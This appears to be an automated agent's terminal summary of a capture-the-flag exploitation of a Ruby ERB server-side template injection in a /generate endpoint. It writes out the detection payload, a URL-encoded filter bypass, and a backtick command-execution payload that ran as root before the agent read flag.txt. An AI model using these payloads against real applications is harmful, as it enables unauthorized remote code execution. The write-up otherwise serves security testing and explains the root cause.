[35mв”Ӯ[0m Successfully exploited a **Ruby ERB Server-Side Template Injection (SSTI)** vulnerability in the `/generate` endpoint to achieve remote code execution and retrieve the flag.         [35mв”Ӯ[0m
[35mв”Ӯ[0m                                                                                                                                                                                       [35mв”Ӯ[0m
[35mв”Ӯ[0m **Vulnerability Type:** Ruby ERB Server-Side Template Injection (SSTI)                                                                                                                [35mв”Ӯ[0m
[35mв”Ӯ[0m                                                                                                                                                                                       [35mв”Ӯ[0m
[35mв”Ӯ[0m **Endpoint Tested:** `/generate` (POST)                                                                                                                                               [35mв”Ӯ[0m
[35mв”Ӯ[0m                                                                                                                                                                                       [35mв”Ӯ[0m
[35mв”Ӯ[0m **Testing Progression:**                                                                                                                                                              [35mв”Ӯ[0m
[35mв”Ӯ[0m 1. **Basic Reflection Test:** Sent `sentence=test&number=1` - confirmed input reflection in response (sentence value appears in `<p>` tags)                                           [35mв”Ӯ[0m
[35mв”Ӯ[0m 2. **SSTI Detection Attempt:** Sent raw `<%=7*7%>` - received 400 error "invalid %-encoding" (server detected special characters)                                                     [35mв”Ӯ[0m
[35mв”Ӯ[0m 3. **Bypass with URL Encoding:** Sent URL-encoded `%3C%25%3D7%2A7%25%3E` - received "49" in response, confirming template injection                                                   [35mв”Ӯ[0m
[35mв”Ӯ[0m 4. **Command Execution:** Sent `%3C%25%3D%60id%60%25%3E` - received "uid=0(root) gid=0(root) groups=0(root)" confirming RCE as root                                                   [35mв”Ӯ[0m
[35mв”Ӯ[0m 5. **File System Exploration:** Used `ls -la /` and `ls -la /app` to locate `flag.txt` in `/app` directory                                                                            [35mв”Ӯ[0m
[35mв”Ӯ[0m 6. **Flag Extraction:** Used `cat /app/flag.txt` to retrieve the flag                                                                                                                 [35mв”Ӯ[0m
[35mв”Ӯ[0m                                                                                                                                                                                       [35mв”Ӯ[0m
[35mв”Ӯ[0m **What Worked:** URL-encoded Ruby ERB template syntax (`%3C%25%3D%60command%60%25%3E`) successfully bypassed input validation and executed system commands. The application uses Ruby [35mв”Ӯ[0m
[35mв”Ӯ[0m ERB templating with the `sentence` parameter directly interpolated into templates without sanitization.                                                                               [35mв”Ӯ[0m
[35mв”Ӯ[0m                                                                                                                                                                                       [35mв”Ӯ[0m
[35mв”Ӯ[0m **Authentication State:** None required - vulnerability is accessible to unauthenticated users.                                                                                       [35mв”Ӯ[0m
[35mв”Ӯ[0m                                                                                                                                                                                       [35mв”Ӯ[0m
[35mв”Ӯ[0m **Root Cause:** The application passes user input from the `sentence` parameter through Ruby ERB templates without proper input sanitization or sandbox restrictions, allowing        [35mв”Ӯ[0m
[35mв”Ӯ[0m arbitrary Ruby code execution including backtick command execution.                                                                                                                   [35mв”Ӯ[0m
[35mв”Ӯ[0m                                                                                                                                                                                       [35mв”Ӯ[0m
